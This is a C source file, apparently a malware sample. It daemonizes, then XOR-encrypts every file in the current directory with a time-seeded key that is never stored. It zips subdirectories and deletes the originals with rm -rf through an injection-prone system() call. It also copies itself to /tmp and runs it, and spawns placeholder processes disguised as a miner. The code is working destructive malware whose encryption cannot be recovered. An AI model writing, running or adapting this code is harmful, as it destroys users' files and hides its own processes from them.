#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/prctl.h>

#define XOR_KEY_LEN 32
#define MAX_PATH 512

char xor_key[XOR_KEY_LEN];
char current_dir[MAX_PATH];
time_t exec_time;

void xor_encrypt(const char *filepath) {
    FILE *fp = fopen(filepath, "rb+");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    rewind(fp);

    char *buffer = malloc(fsize);
    fread(buffer, 1, fsize, fp);
    rewind(fp);

    for (int i = 0; i < fsize; i++) {
        buffer[i] ^= xor_key[i % XOR_KEY_LEN];
    }

    fwrite(buffer, 1, fsize, fp);
    fclose(fp);
    free(buffer);
}

void wannacryptor(const char *target_dir) {
    DIR *dir = opendir(target_dir);
    struct dirent *entry;

    if (!dir) return;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s/%s", target_dir, entry->d_name);

        struct stat st;
        stat(fullpath, &st);

        if (S_ISDIR(st.st_mode)) {
            char zipname[MAX_PATH];
            snprintf(zipname, MAX_PATH, "%s.zip", fullpath);
            
            char cmd[MAX_PATH * 2];
            snprintf(cmd, sizeof(cmd), "zip -r -q '%s' '%s' && rm -rf '%s'", zipname, fullpath, fullpath);
            system(cmd);
            xor_encrypt(zipname);
        } else {
            xor_encrypt(fullpath);
        }
    }
    closedir(dir);
}

void spread_trojan() {
    char *target = "/tmp/trojan.wrm";
    FILE *src = fopen("./runme", "rb");
    FILE *dst = fopen(target, "wb");
    if (!src || !dst) return;

    char buf[1024];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
        fwrite(buf, 1, n, dst);
    }
    fclose(src);
    fclose(dst);
    chmod(target, 0755);
    if (fork() == 0) execl(target, target, NULL);
}

void rodok_miner() {
    if (fork() == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
        setsid();

        for (int i = 0; i < 4; i++) {
            if (fork() == 0) {
                char name[32];
                snprintf(name, sizeof(name), "mine-crafter-%d", i);
                prctl(PR_SET_NAME, name, 0, 0, 0);
                while (1) pause();
            }
        }
        while (1) pause();
    }
}

int main() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    umask(0);
    setsid();

    getcwd(current_dir, sizeof(current_dir));
    exec_time = time(NULL);
    srand(exec_time);
    for (int i = 0; i < XOR_KEY_LEN; i++) xor_key[i] = rand() % 256;

    if (fork() == 0) {
        wannacryptor(current_dir);
        exit(0);
    }
    if (fork() == 0) {
        spread_trojan();
        exit(0);
    }
    if (fork() == 0) {
        rodok_miner();
        exit(0);
    }

    while (1) pause();
    return 0;
}
